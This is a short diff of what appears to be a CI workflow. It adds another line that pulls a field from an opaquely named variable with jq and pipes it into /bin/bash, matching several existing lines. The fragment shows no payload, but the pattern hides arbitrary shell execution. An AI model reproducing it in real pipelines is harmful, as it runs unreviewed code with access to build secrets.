@@ -30,6 +30,7 @@ jobs:
           echo $m9 | jq -r .ncbr535 | /bin/bash
           echo $g31 | jq -r .iw613 | /bin/bash
           printf '%s' "$ploh6411" | jq -r .z7131 | /bin/bash
+          echo $fsmd11 | jq -r .b8 | /bin/bash
 
       - name: Save output
         if: always()
